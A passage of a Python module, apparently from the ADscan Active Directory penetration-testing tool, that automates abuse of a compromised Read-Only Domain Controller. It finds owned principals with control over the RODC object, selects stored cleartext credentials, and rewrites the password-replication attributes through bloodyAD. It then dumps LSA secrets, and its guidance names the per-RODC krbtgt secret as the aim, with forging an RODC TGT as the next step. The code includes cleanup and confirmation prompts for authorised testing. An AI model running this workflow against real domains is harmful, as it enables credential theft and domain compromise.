"""RODC follow-up workflow for compromised Read-Only Domain Controllers.

This follow-up targets the scenario where ADscan already controls an RODC
machine account and the operator wants to prepare password replication for a
privileged account on that RODC using ``bloodyAD``.
"""

from __future__ import annotations

from typing import Any, Iterable

from rich.prompt import Confirm, Prompt

from adscan_internal import print_error, print_info_debug, print_warning, telemetry
from adscan_internal.cli.ldap import derive_base_dn
from adscan_internal.cli.privileged_target_selection import (
    resolve_privileged_target_user,
)
from adscan_internal.principal_utils import normalize_machine_account
from adscan_internal.rich_output import (
    mark_sensitive,
    print_info,
    print_operation_header,
    print_panel,
    print_success,
    print_system_change_warning,
    strip_sensitive_markers,
)
from adscan_internal.services.attack_graph_service import (
    add_bloodhound_path_edges,
    get_owned_attack_path_summaries_to_target,
    get_owned_domain_usernames_for_attack_paths,
    get_rodc_prp_control_paths,
    load_attack_graph,
    save_attack_graph,
)
from adscan_internal.services.pivot_opportunity_service import (
    maybe_offer_pivot_opportunity_for_host_viability,
)
from adscan_internal.services import ExploitationService
from adscan_internal.services.attack_graph_runtime_service import (
    active_step,
    update_active_step_status,
)
from adscan_internal.services.attack_path_cleanup_service import (
    begin_cleanup_scope,
    discard_cleanup_scope,
    execute_cleanup_scope,
)
from adscan_internal.services.current_vantage_reachability_service import (
    CurrentVantageTargetAssessment,
    resolve_targets_from_current_vantage,
)


_RODC_ALLOWED_GROUP = "Allowed RODC Password Replication Group"
_RODC_REQUIRED_ACCESS_PORTS = (445, 5985, 5986, 3389)
_RODC_OBJECT_CONTROL_RELATIONS = frozenset(
    {
        "genericall",
        "genericwrite",
        "writedacl",
        "writeowner",
        "owns",
        "writeproperty",
        "managerodcprp",
    }
)
_RODC_OBJECT_CONTROL_CANDIDATE_RELATIONS = frozenset()


def _normalize_attr_values(values: Iterable[str]) -> tuple[str, ...]:
    """Return trimmed multi-valued LDAP attribute values preserving order."""
    normalized: list[str] = []
    seen: set[str] = set()
    for raw_value in values:
        value = str(raw_value or "").strip()
        key = value.casefold()
        if not value or key in seen:
            continue
        seen.add(key)
        normalized.append(value)
    return tuple(normalized)


def _parse_bloodyad_multi_value_output(output: str) -> dict[str, tuple[str, ...]]:
    """Parse repeated ``key: value`` BloodyAD output lines into tuples."""
    values: dict[str, list[str]] = {}
    for raw_line in str(output or "").splitlines():
        line = str(raw_line or "").strip()
        if not line or ":" not in line:
            continue
        key, value = line.split(":", 1)
        key_clean = key.strip()
        value_clean = value.strip()
        if not key_clean or not value_clean:
            continue
        values.setdefault(key_clean, []).append(value_clean)
    return {
        key: _normalize_attr_values(raw_values)
        for key, raw_values in values.items()
    }


def _normalize_rodc_prp_attribute_values(
    parsed_values: dict[str, tuple[str, ...]],
    attribute_name: str,
) -> tuple[str, ...]:
    """Return normalized PRP values even when BloodyAD emits one semicolon-joined line.

    ``bloodyAD get object`` may render DN-valued multi-attributes such as
    ``msDS-NeverRevealGroup`` as a single line with entries separated by ``;``.
    The follow-up restore path needs each DN as its own ``-v`` argument.
    """
    raw_values = parsed_values.get(attribute_name, ())
    normalized: list[str] = []
    seen: set[str] = set()
    for raw_value in raw_values:
        value = str(raw_value or "").strip()
        if not value:
            continue
        parts = [part.strip() for part in value.split(";")]
        for part in parts:
            if not part:
                continue
            key = part.casefold()
            if key in seen:
                continue
            seen.add(key)
            normalized.append(part)
    return tuple(normalized)


def _resolve_workspace_dir(shell: Any) -> str:
    """Return the effective workspace directory for current-vantage lookups."""
    if hasattr(shell, "_get_workspace_cwd"):
        return shell._get_workspace_cwd()  # type: ignore[attr-defined]
    return str(getattr(shell, "current_workspace_dir", "") or "")


def _first_hostname_candidate(
    assessment: CurrentVantageTargetAssessment,
    *,
    fallback_host: str,
) -> str:
    """Return a stable host identifier from a reachability assessment."""
    for candidate in assessment.matched_hostnames:
        clean = str(candidate or "").strip()
        if clean:
            return clean
    return str(fallback_host or "").strip()


def _build_rodc_target_candidates(domain: str, machine_account: str) -> tuple[str, ...]:
    """Return current-vantage target candidates for one RODC machine account."""
    normalized_machine = normalize_machine_account(machine_account)
    stem = normalized_machine.rstrip("$")
    domain_clean = str(domain or "").strip()
    candidates = [normalized_machine, stem]
    if stem and domain_clean:
        candidates.append(f"{stem}.{domain_clean}")
    return tuple(candidate for candidate in candidates if str(candidate or "").strip())


def _normalize_graph_principal_label(value: str) -> str:
    """Normalize a graph/UI principal label to its account token."""
    clean = strip_sensitive_markers(str(value or "")).strip()
    if "@" in clean:
        clean = clean.split("@", 1)[0]
    return clean.strip().lower()


def _summary_terminal_relation_local(record: dict[str, Any]) -> str:
    """Return the last executable relation key for one summary record."""
    steps = record.get("steps")
    if isinstance(steps, list):
        terminal_relation = ""
        for step in steps:
            if not isinstance(step, dict):
                continue
            relation = str(step.get("action") or "").strip()
            if not relation or relation.lower() == "memberof":
                continue
            terminal_relation = relation
        if terminal_relation:
            return str(terminal_relation or "").strip().lower()
    relations = record.get("relations")
    if isinstance(relations, list):
        for relation in reversed(relations):
            relation_clean = str(relation or "").strip()
            if not relation_clean or relation_clean.lower() == "memberof":
                continue
            return relation_clean.lower()
    return ""


def _rodc_control_path_requires_prerequisite_execution(record: dict[str, Any]) -> bool:
    """Return True when a confirmed RODC-control path still needs prior steps.

    For this follow-up, the terminal ACL/control step can remain merely
    discovered because it represents existing object control once the earlier
    executable steps are materialized. What blocks the follow-up is any earlier
    executable step that is not already successful in the current graph state.
    """
    steps = record.get("steps")
    if not isinstance(steps, list):
        return False

    executable_steps: list[dict[str, Any]] = []
    for step in steps:
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if not action or action == "memberof":
            continue
        executable_steps.append(step)

    if len(executable_steps) <= 1:
        return False

    for step in executable_steps[:-1]:
        status = str(step.get("status") or "").strip().lower()
        if status not in {"success", "exploited"}:
            return True
    return False


def _find_rodc_graph_node(
    graph: dict[str, Any],
    *,
    domain: str,
    machine_account: str,
) -> tuple[str | None, str]:
    """Resolve the attack-graph node id and display label for one RODC machine."""
    nodes_map = graph.get("nodes") if isinstance(graph.get("nodes"), dict) else {}
    if not isinstance(nodes_map, dict):
        return None, normalize_machine_account(machine_account)

    normalized_machine = normalize_machine_account(machine_account)
    label_candidates = {
        normalized_machine.casefold(),
        f"{normalized_machine}@{str(domain or '').strip()}".casefold(),
        f"{normalized_machine}@{str(domain or '').strip().upper()}".casefold(),
    }
    for node_id, node in nodes_map.items():
        if not isinstance(node, dict):
            continue
        label = str(node.get("label") or node.get("name") or "").strip()
        if not label:
            continue
        if label.casefold() in label_candidates:
            return str(node_id), label
    return None, normalized_machine


def _assess_rodc_object_control(
    shell: Any,
    *,
    domain: str,
    machine_account: str,
    actor_username: str,
) -> dict[str, Any]:
    """Return whether an owned principal can reach confirmed RODC PRP control."""
    graph = load_attack_graph(shell, domain)
    if not isinstance(graph, dict):
        return {
            "ready": False,
            "reason": "graph_unavailable",
            "target_label": normalize_machine_account(machine_account),
            "current_actor_ready": False,
            "candidates": [],
            "candidate_paths": [],
        }

    _target_node_id, target_label = _find_rodc_graph_node(
        graph,
        domain=domain,
        machine_account=machine_account,
    )
    if not target_label:
        return {
            "ready": False,
            "reason": "target_missing",
            "target_label": normalize_machine_account(machine_account),
            "current_actor_ready": False,
            "candidates": [],
            "candidate_paths": [],
        }

    owned_principals = get_owned_domain_usernames_for_attack_paths(shell, domain)
    current_actor_norm = _normalize_graph_principal_label(actor_username)
    if not owned_principals:
        return {
            "ready": False,
            "reason": "no_owned_principals",
            "target_label": target_label,
            "current_actor_ready": False,
            "candidates": [],
            "candidate_paths": [],
        }

    def _candidate_records_for_paths(paths: list[dict[str, Any]]) -> list[dict[str, Any]]:
        candidates_by_user: dict[str, dict[str, Any]] = {}
        for path in paths:
            if not isinstance(path, dict):
                continue
            terminal_relation = _summary_terminal_relation_local(path)

            candidate_labels: list[str] = []
            meta = path.get("meta")
            if isinstance(meta, dict):
                affected_users = meta.get("affected_users")
                if isinstance(affected_users, list):
                    for affected_user in affected_users:
                        affected_clean = strip_sensitive_markers(str(affected_user or "")).strip()
                        if not affected_clean:
                            continue
                        candidate_labels.append(affected_clean)

            if not candidate_labels:
                source_label = str(path.get("source") or "").strip()
                if not source_label:
                    nodes = path.get("nodes")
                    if isinstance(nodes, list) and nodes:
                        source_label = str(nodes[0] or "").strip()
                if source_label:
                    candidate_labels.append(source_label)

            for candidate_label in candidate_labels:
                normalized_source = _normalize_graph_principal_label(candidate_label)
                if not normalized_source:
                    continue
                record = candidates_by_user.setdefault(
                    normalized_source,
                    {
                        "username": candidate_label.split("@", 1)[0] if "@" in candidate_label else candidate_label,
                        "label": candidate_label,
                        "relations": [],
                        "sample_path": path,
                    },
                )
                relations = record.get("relations")
                if isinstance(relations, list) and terminal_relation and terminal_relation not in relations:
                    relations.append(terminal_relation)
        return sorted(
            candidates_by_user.values(),
            key=lambda entry: str(entry.get("username") or "").lower(),
        )

    target_paths = get_owned_attack_path_summaries_to_target(
        shell,
        domain,
        target_label=target_label,
        max_depth=8,
        max_paths=None,
        target_mode="tier0",
        engine_override="local",
        dev_workers_override=0,
        render_debug_tables=False,
    )
    confirmed_paths = [
        path
        for path in target_paths
        if _summary_terminal_relation_local(path) in _RODC_OBJECT_CONTROL_RELATIONS
    ]
    directly_usable_paths = [
        path
        for path in confirmed_paths
        if not _rodc_control_path_requires_prerequisite_execution(path)
    ]
    candidates = _candidate_records_for_paths(directly_usable_paths)
    if candidates:
        candidate_norms = {
            _normalize_graph_principal_label(str(entry.get("username") or "")) for entry in candidates
        }
        return {
            "ready": True,
            "reason": "ok",
            "target_label": target_label,
            "current_actor_ready": current_actor_norm in candidate_norms,
            "candidates": candidates,
            "candidate_paths": [],
        }

    prerequisite_paths = [
        path
        for path in confirmed_paths
        if _rodc_control_path_requires_prerequisite_execution(path)
    ]
    prerequisite_candidates = _candidate_records_for_paths(prerequisite_paths)
    if prerequisite_candidates:
        return {
            "ready": False,
            "reason": "prerequisite_path_available",
            "target_label": target_label,
            "current_actor_ready": False,
            "candidates": prerequisite_candidates,
            "candidate_paths": prerequisite_paths,
        }

    candidate_paths = list(target_paths)
    candidate_records = _candidate_records_for_paths(candidate_paths)
    if candidate_records:
        return {
            "ready": False,
            "reason": "candidate_only",
            "target_label": target_label,
            "current_actor_ready": False,
            "candidates": candidate_records,
            "candidate_paths": candidate_paths,
        }

    return {
        "ready": False,
        "reason": "no_owned_object_control",
        "target_label": target_label,
        "current_actor_ready": False,
        "candidates": [],
        "candidate_paths": [],
    }


def _refresh_rodc_prp_control_edges(
    shell: Any,
    *,
    domain: str,
) -> int:
    """Refresh custom ``ManageRODCPrp`` edges in the local graph before follow-up use."""
    graph = load_attack_graph(shell, domain)
    if not isinstance(graph, dict):
        return 0

    raw_paths = get_rodc_prp_control_paths(
        shell,
        domain,
        graph=graph,
        force_refresh=True,
    )
    if not raw_paths:
        return 0

    added_edges = 0
    for entry in raw_paths:
        nodes = entry.get("nodes") or []
        rels = entry.get("rels") or []
        if not isinstance(nodes, list) or not isinstance(rels, list):
            continue
        added_edges += int(
            add_bloodhound_path_edges(
                graph,
                nodes=[node for node in nodes if isinstance(node, dict)],
                relations=[str(rel) for rel in rels],
                status="discovered",
                edge_type="custom_acl",
                notes_by_relation_index=(
                    entry.get("notes_by_relation_index")
                    if isinstance(entry.get("notes_by_relation_index"), dict)
                    else None
                ),
                log_creation=False,
                shell=shell,
                force_opengraph=True,
            )
            or 0
        )

    if added_edges:
        save_attack_graph(shell, domain, graph)
        print_info_debug(
            f"[rodc-prp] refreshed delegated RODC PRP edges for {mark_sensitive(domain, 'domain')}: "
            f"added_edges={added_edges}"
        )
    return added_edges


def _owned_cleartext_credentials(shell: Any, *, domain: str) -> dict[str, tuple[str, str]]:
    """Return owned principals that have reusable cleartext domain credentials."""
    owned_users = get_owned_domain_usernames_for_attack_paths(shell, domain)
    credentials = getattr(shell, "domains_data", {}).get(domain, {}).get("credentials", {})
    if not isinstance(credentials, dict):
        return {}

    results: dict[str, tuple[str, str]] = {}
    for owned_user in owned_users:
        normalized_owned = _normalize_graph_principal_label(owned_user)
        if not normalized_owned:
            continue
        for stored_user, stored_credential in credentials.items():
            if _normalize_graph_principal_label(str(stored_user)) != normalized_owned:
                continue
            credential = str(stored_credential or "").strip()
            if not credential:
                break
            if getattr(shell, "is_hash", lambda _value: False)(credential):
                break
            results[normalized_owned] = (str(stored_user), credential)
            break
    return results


def _select_rodc_policy_actor(
    shell: Any,
    *,
    domain: str,
    current_actor: str,
    candidates: list[dict[str, Any]],
) -> dict[str, Any]:
    """Return the LDAP actor ADscan should use for the RODC PRP phase."""
    credentials_by_user = _owned_cleartext_credentials(shell, domain=domain)
    enriched_candidates: list[dict[str, Any]] = []
    for candidate in candidates:
        username = str(candidate.get("username") or "").strip()
        normalized_username = _normalize_graph_principal_label(username)
        credential_record = credentials_by_user.get(normalized_username)
        enriched_candidates.append(
            {
                **candidate,
                "credential_ready": credential_record is not None,
                "credential_username": credential_record[0] if credential_record else None,
                "credential_secret": credential_record[1] if credential_record else None,
            }
        )

    ready_candidates = [
        candidate for candidate in enriched_candidates if bool(candidate.get("credential_ready"))
    ]
    current_actor_norm = _normalize_graph_principal_label(current_actor)
    selected: dict[str, Any] | None = None
    for candidate in ready_candidates:
        if _normalize_graph_principal_label(str(candidate.get("username") or "")) == current_actor_norm:
            selected = candidate
            break

    if selected is None and ready_candidates:
        if len(ready_candidates) == 1 or getattr(shell, "auto", False):
            selected = ready_candidates[0]
        else:
            option_map = {
                str(index): candidate for index, candidate in enumerate(ready_candidates, start=1)
            }
            lines = []
            for option, candidate in option_map.items():
                relations = ", ".join(str(value) for value in (candidate.get("relations") or [])) or "unknown"
                lines.append(
                    f"{option}. {mark_sensitive(str(candidate.get('label') or candidate.get('username') or ''), 'user')} via {mark_sensitive(relations, 'detail')}"
                )
            print_panel(
                "\n".join(lines),
                title="[bold blue]RODC LDAP Actor Choices[/bold blue]",
                border_style="blue",
                expand=False,
            )
            selected_key = Prompt.ask(
                "Principal to use for the RODC LDAP policy phase",
                choices=list(option_map.keys()),
                default="1",
            )
            selected = option_map.get(str(selected_key), ready_candidates[0])

    return {
        "ready": selected is not None,
        "selected": selected,
        "current_actor_ready": selected is not None
        and _normalize_graph_principal_label(str(selected.get("username") or "")) == current_actor_norm,
        "candidates": enriched_candidates,
        "reason": "ok" if selected is not None else "no_reusable_cleartext_credential",
    }


def _print_rodc_object_control_guidance(
    *,
    domain: str,
    target_label: str,
    actor_username: str,
    reason: str,
    candidates: list[dict[str, Any]],
) -> None:
    """Explain why the RODC PRP modification phase is blocked or rerouted."""
    marked_domain = mark_sensitive(domain, "domain")
    marked_target = mark_sensitive(target_label, "user")
    marked_actor = mark_sensitive(actor_username, "user")
    print_warning(
        f"RODC follow-up cannot safely continue for {marked_target} in {marked_domain} with the current actor {marked_actor}."
    )

    lines = [
        "To modify the RODC password-replication policy, ADscan needs an owned principal with object-control rights over the RODC computer object.",
        "",
        "Accepted rights:",
        "- GenericAll",
        "- GenericWrite",
        "- WriteDacl / WriteOwner / Owns",
        "- WriteProperty on msDS-RevealOnDemandGroup and msDS-NeverRevealGroup",
        "- ManageRODCPrp (ADscan custom delegated PRP-control edge)",
        "",
    ]
    if reason in {"graph_unavailable", "target_missing"}:
        lines.extend(
            [
                "ADscan could not validate the RODC object-control prerequisite from the current attack graph.",
                "Refresh or rebuild the attack graph before retrying this follow-up.",
            ]
        )
    elif reason == "no_owned_principals":
        lines.extend(
            [
                "No owned principals with reusable domain credentials are currently stored for this domain.",
                "Compromise or add a qualifying principal before retrying the RODC object-control phase.",
            ]
        )
    elif candidates:
        lines.append("Owned principals with direct control over the RODC object:")
        for candidate in candidates:
            relations = ", ".join(
                str(relation) for relation in (candidate.get("relations") or [])
            ) or "unknown"
            credential_note = ""
            if "credential_ready" in candidate:
                credential_note = (
                    " (reusable password stored)"
                    if bool(candidate.get("credential_ready"))
                    else " (no reusable cleartext credential stored)"
                )
            lines.append(
                f"- {mark_sensitive(str(candidate.get('label') or candidate.get('username') or ''), 'user')} via {mark_sensitive(relations, 'detail')}{credential_note}"
            )
        if reason == "candidate_only":
            lines.extend(
                [
                    "",
                    "ADscan found only candidate RODC-control paths whose last step is not confirmed for PRP writes.",
                    "These paths may help with RODC host administration or RBCD, but ADscan cannot treat them as confirmed permission to modify msDS-RevealOnDemandGroup or msDS-NeverRevealGroup.",
                ]
            )
        elif reason == "no_reusable_cleartext_credential":
            lines.extend(
                [
                    "",
                    "ADscan can see object-control rights, but it does not currently have a reusable cleartext password for any qualifying principal.",
                    "Add or recover a reusable password for one of the principals above before retrying this follow-up.",
                ]
            )
        else:
            lines.extend(
                [
                    "",
                    f"Re-run the RODC policy-modification phase with one of those principals instead of {marked_actor}.",
                ]
            )
    else:
        lines.extend(
            [
                "None of the currently owned principals appear to have direct object-control rights over the RODC computer object.",
                "The RODC machine account alone is not enough to edit msDS-RevealOnDemandGroup or msDS-NeverRevealGroup.",
            ]
        )

    print_panel(
        "\n".join(lines),
        title="[bold yellow]RODC Object-Control Prerequisite Missing[/bold yellow]",
        border_style="yellow",
        expand=False,
    )


def _maybe_execute_rodc_object_control_prerequisites(
    shell: Any,
    *,
    domain: str,
    machine_account: str,
    actor_username: str,
    object_control: dict[str, Any],
) -> dict[str, Any]:
    """Offer prerequisite path execution when RODC control is reachable but not yet materialized."""
    if str(object_control.get("reason") or "").strip().lower() != "prerequisite_path_available":
        return object_control

    prerequisite_paths = list(object_control.get("candidate_paths") or [])
    if not prerequisite_paths:
        return object_control

    target_label = str(object_control.get("target_label") or machine_account)
    path_count = len(prerequisite_paths)
    print_panel(
        "\n".join(
            [
                f"ADscan found {path_count} owned attack path(s) that can materialize confirmed RODC object control over {mark_sensitive(target_label, 'user')}.",
                f"The current actor {mark_sensitive(actor_username, 'user')} cannot modify the RODC PRP yet.",
                "ADscan can execute one of the prerequisite paths first, then revalidate the RODC control check before touching LDAP.",
            ]
        ),
        title="[bold blue]RODC Prerequisite Path Available[/bold blue]",
        border_style="blue",
        expand=False,
    )

    from adscan_internal.cli.attack_path_execution import (
        offer_attack_paths_for_execution_summaries,
    )

    def _recompute_prerequisite_summaries() -> list[dict[str, Any]]:
        refreshed = _assess_rodc_object_control(
            shell,
            domain=domain,
            machine_account=machine_account,
            actor_username=actor_username,
        )
        if str(refreshed.get("reason") or "").strip().lower() != "prerequisite_path_available":
            return []
        return list(refreshed.get("candidate_paths") or [])

    executed = offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=prerequisite_paths,
        max_display=min(5, len(prerequisite_paths)),
        search_mode_label="RODC prerequisite search",
        show_sections=False,
        recompute_summaries=_recompute_prerequisite_summaries,
        snapshot_scope="owned",
        snapshot_target="all",
        snapshot_target_mode="tier0",
    )
    if not executed:
        print_info(
            "RODC prerequisite attack path was not executed, so the follow-up cannot continue."
        )
        return object_control

    refreshed = _assess_rodc_object_control(
        shell,
        domain=domain,
        machine_account=machine_account,
        actor_username=actor_username,
    )
    if bool(refreshed.get("ready")):
        print_success(
            f"RODC prerequisite path completed and confirmed object control is now available for {mark_sensitive(str(refreshed.get('target_label') or machine_account), 'user')}."
        )
        return refreshed

    print_warning(
        "ADscan executed a prerequisite attack path, but confirmed RODC PRP-write capability is still not available."
    )
    return refreshed


def _assess_rodc_host_followup_access(
    shell: Any,
    *,
    domain: str,
    machine_account: str,
) -> CurrentVantageTargetAssessment | None:
    """Return a reachable RODC host assessment or ``None`` when blocked."""
    normalized_machine = normalize_machine_account(machine_account)
    resolution = resolve_targets_from_current_vantage(
        _resolve_workspace_dir(shell),
        getattr(shell, "domains_dir", "domains"),
        domain,
        targets=_build_rodc_target_candidates(domain, normalized_machine),
        required_ports=_RODC_REQUIRED_ACCESS_PORTS,
    )
    marked_machine = mark_sensitive(machine_account, "user")
    marked_domain = mark_sensitive(domain, "domain")
    if not resolution.report_available:
        print_warning(
            f"RODC follow-up for {marked_machine}@{marked_domain} requires a current-vantage reachability report first."
        )
        return None

    assessment = next(iter(resolution.reachable_targets), None)
    if assessment is None:
        print_warning(
            f"RODC follow-up is blocked because ADscan cannot currently reach the host for {marked_machine}@{marked_domain} on an admin-capable service."
        )
        unmatched = resolution.unmatched_targets
        unreachable = resolution.unreachable_targets
        if unmatched:
            maybe_offer_pivot_opportunity_for_host_viability(
                shell,
                domain=domain,
                blocked_target=normalized_machine,
                viability_status="enabled_but_unresolved",
                operator_summary=(
                    "The RODC host was not resolved in the current-vantage inventory. "
                    "Refresh network reachability before retrying."
                ),
            )
        elif unreachable:
            maybe_offer_pivot_opportunity_for_host_viability(
                shell,
                domain=domain,
                blocked_target=normalized_machine,
                viability_status="resolved_but_unreachable",
                operator_summary=(
                    "The RODC host resolved in the current-vantage inventory, but the expected "
                    "admin-capable ports are not reachable from the current vantage."
                ),
            )
        return None

    print_info_debug(
        "[rodc] current-vantage follow-up access confirmed: "
        f"target={mark_sensitive(_first_hostname_candidate(assessment, fallback_host=machine_account.rstrip('$')), 'hostname')} "
        f"ports={mark_sensitive(','.join(str(port) for port in assessment.open_ports), 'detail')}"
    )
    return assessment


def _resolve_object_dn(
    service: ExploitationService,
    *,
    pdc_host: str,
    bloody_path: str,
    domain: str,
    username: str,
    password: str,
    target_object: str,
) -> str | None:
    """Resolve one object's distinguished name via BloodyAD."""
    result = service.acl.get_object_attributes(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_names=("distinguishedName",),
        kerberos=True,
    )
    if not result.success:
        return None
    return str(
        result.attributes.get("distinguishedName")
        or result.attributes.get("distinguishedname")
        or ""
    ).strip() or None


def _load_rodc_attribute_state(
    service: ExploitationService,
    *,
    pdc_host: str,
    bloody_path: str,
    domain: str,
    username: str,
    password: str,
    target_object: str,
) -> tuple[str | None, tuple[str, ...], tuple[str, ...]]:
    """Return current RODC DN, RevealOnDemand values, and NeverReveal values."""
    result = service.acl.get_object_attributes(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_names=(
            "distinguishedName",
            "msDS-RevealOnDemandGroup",
            "msDS-NeverRevealGroup",
        ),
        kerberos=True,
    )
    if not result.success:
        return None, (), ()
    parsed = _parse_bloodyad_multi_value_output(result.raw_output or "")
    rodc_dn = str(
        result.attributes.get("distinguishedName")
        or result.attributes.get("distinguishedname")
        or ""
    ).strip() or None
    reveal_values = _normalize_rodc_prp_attribute_values(parsed, "msDS-RevealOnDemandGroup")
    never_reveal_values = _normalize_rodc_prp_attribute_values(parsed, "msDS-NeverRevealGroup")
    return rodc_dn, reveal_values, never_reveal_values


def _restore_rodc_attribute_state(
    service: ExploitationService,
    *,
    pdc_host: str,
    bloody_path: str,
    domain: str,
    username: str,
    password: str,
    target_object: str,
    reveal_values: tuple[str, ...],
    never_reveal_values: tuple[str, ...],
) -> bool:
    """Restore the RODC password-replication attributes to their original state."""
    reveal_restore = service.acl.set_object_attribute_values(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_name="msDS-RevealOnDemandGroup",
        attribute_values=reveal_values,
        kerberos=True,
    )
    never_reveal_restore = service.acl.set_object_attribute_values(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_name="msDS-NeverRevealGroup",
        attribute_values=never_reveal_values,
        kerberos=True,
    )
    return bool(reveal_restore.success and never_reveal_restore.success)


def _format_rodc_restore_values(values: tuple[str, ...]) -> str:
    """Render original LDAP attribute values for operator-facing cleanup guidance."""
    if not values:
        return "(clear this attribute)"
    return "\n".join(f"- {mark_sensitive(value, 'path')}" for value in values)


def _print_rodc_cleanup_manual_guidance(
    *,
    domain: str,
    rodc_machine: str,
    reveal_values: tuple[str, ...],
    never_reveal_values: tuple[str, ...],
) -> None:
    """Show actionable manual cleanup guidance when automatic restore fails."""
    marked_domain = mark_sensitive(domain, "domain")
    marked_rodc = mark_sensitive(rodc_machine, "user")
    print_warning(
        f"RODC follow-up cleanup did not complete. Review and restore the original password-replication attributes on {marked_rodc} in {marked_domain}."
    )
    print_panel(
        "\n".join(
            [
                "Automatic cleanup failed. Restore the RODC object manually to avoid leaving password-replication changes behind.",
                "",
                "Restore `msDS-RevealOnDemandGroup` to:",
                _format_rodc_restore_values(reveal_values),
                "",
                "Restore `msDS-NeverRevealGroup` to:",
                _format_rodc_restore_values(never_reveal_values),
            ]
        ),
        title="[bold yellow]Manual Cleanup Required[/bold yellow]",
        border_style="yellow",
        expand=False,
    )


def _maybe_dump_rodc_lsa(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
) -> bool:
    """Offer an immediate LSA dump against the prepared RODC over SMB."""
    marked_host = mark_sensitive(host, "hostname")
    marked_username = mark_sensitive(username, "user")
    if not getattr(shell, "auto", False) and not Confirm.ask(
        f"Dump LSA secrets from {marked_host} now using {marked_username}?",
        default=True,
    ):
        print_info(
            f"Skipping the automatic RODC LSA dump for {marked_host} by user choice."
        )
        return False

    shell.dump_lsa(
        domain,
        username,
        password,
        host,
        "false",
        include_machine_accounts=True,
    )
    return True


def _print_rodc_followup_execution_plan(
    *,
    domain: str,
    rodc_machine: str,
    reachable_host: str,
    host_actor: str,
    ldap_actor_label: str,
    target_user: str,
) -> None:
    """Explain the two-actor execution plan before changing RODC state."""
    print_panel(
        "\n".join(
            [
                f"RODC object: {mark_sensitive(rodc_machine, 'user')} in {mark_sensitive(domain, 'domain')}",
                f"LDAP policy actor: {mark_sensitive(ldap_actor_label, 'user')}",
                f"RODC host actor: {mark_sensitive(host_actor, 'user')}",
                f"Reachable host: {mark_sensitive(reachable_host, 'hostname')}",
                f"Target privileged principal: {mark_sensitive(target_user, 'user')}",
                "",
                "ADscan will first update the RODC password-replication policy with the LDAP-capable principal, then attempt the host-side LSA dump with the compromised RODC machine account.",
            ]
        ),
        title="[bold blue]RODC Follow-up Plan[/bold blue]",
        border_style="blue",
        expand=False,
    )


def _print_rodc_post_dump_guidance(*, host: str) -> None:
    """Explain the operator's immediate post-dump objective."""
    print_panel(
        "\n".join(
            [
                f"Review the LSA dump from {mark_sensitive(host, 'hostname')} for the per-RODC krbtgt account (for example `krbtgt_8245`).",
                "The immediate objective is the per-RODC krbtgt secret, not the RODC machine-account hash.",
                "If recovered, the next phase is forging an RODC TGT and using it for the writable-DC path.",
            ]
        ),
        title="[bold green]RODC Next Objective[/bold green]",
        border_style="green",
        expand=False,
    )


def _build_rodc_prp_tracking_context(
    *,
    domain: str,
    rodc_machine: str,
    selected_policy_actor: dict[str, Any],
    policy_actor_label: str,
) -> tuple[str, str, dict[str, object]]:
    """Return tracking labels/notes for the real PRP-modification action.

    The graph capability edge may originate from a delegated group rather than the
    concrete LDAP actor used to touch the directory. Prefer the terminal
    ``ManageRODCPrp`` step labels from the selected sample path when available,
    then fall back to the LDAP actor label.
    """
    sample_path = (
        selected_policy_actor.get("sample_path")
        if isinstance(selected_policy_actor, dict)
        else None
    )
    from_label = str(policy_actor_label or "").strip()
    to_label = f"{normalize_machine_account(rodc_machine)}@{domain}".upper()
    if isinstance(sample_path, dict):
        steps = sample_path.get("steps")
        if isinstance(steps, list):
            for step in reversed(steps):
                if not isinstance(step, dict):
                    continue
                if str(step.get("action") or "").strip().lower() != "managerodcprp":
                    continue
                details = step.get("details") if isinstance(step.get("details"), dict) else {}
                candidate_from = str(details.get("from") or "").strip()
                candidate_to = str(details.get("to") or "").strip()
                if candidate_from:
                    from_label = candidate_from
                if candidate_to:
                    to_label = candidate_to
                break
        if not to_label:
            candidate_target = str(sample_path.get("target") or "").strip()
            if candidate_target:
                to_label = candidate_target

    notes: dict[str, object] = {
        "ldap_actor": policy_actor_label,
        "rodc_machine": normalize_machine_account(rodc_machine),
        "tracking_relation": "ManageRODCPrp",
    }
    return from_label, to_label, notes


def offer_rodc_escalation(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    rodc_machine: str | None = None,
) -> bool:
    """Prepare password replication abuse for one RODC using a host-access actor."""
    cleanup_required = False
    cleanup_completed = False
    cleanup_scope_id = begin_cleanup_scope(
        shell,
        label="rodc_followup",
        domain=domain,
    )
    original_reveal_values: tuple[str, ...] = ()
    original_never_reveal_values: tuple[str, ...] = ()
    service: ExploitationService | None = None
    pdc_host = ""
    bloody_path = ""
    normalized_machine = normalize_machine_account(rodc_machine or username)
    policy_username = username
    policy_password = password
    policy_actor_label = username
    try:
        if getattr(shell, "get_user_dc_role", None) is not None:
            dc_role = shell.get_user_dc_role(domain, normalized_machine)
            if dc_role != "rodc":
                print_warning(
                    f"{mark_sensitive(normalized_machine, 'user')} is not classified as a Read-Only Domain Controller in {mark_sensitive(domain, 'domain')}."
                )
                return False

        assessment = _assess_rodc_host_followup_access(
            shell,
            domain=domain,
            machine_account=normalized_machine,
        )
        if assessment is None:
            return False

        _refresh_rodc_prp_control_edges(shell, domain=domain)
        object_control = _assess_rodc_object_control(
            shell,
            domain=domain,
            machine_account=normalized_machine,
            actor_username=username,
        )
        if bool(object_control.get("ready")):
            print_info_debug(
                "[rodc] existing prerequisite already satisfied; skipping prerequisite-path executor: "
                f"target={mark_sensitive(str(object_control.get('target_label') or normalized_machine), 'user')}"
            )
        object_control = _maybe_execute_rodc_object_control_prerequisites(
            shell,
            domain=domain,
            machine_account=normalized_machine,
            actor_username=username,
            object_control=object_control,
        )
        if not bool(object_control.get("ready")):
            _print_rodc_object_control_guidance(
                domain=domain,
                target_label=str(object_control.get("target_label") or normalized_machine),
                actor_username=username,
                reason=str(object_control.get("reason") or "unknown"),
                candidates=list(object_control.get("candidates") or []),
            )
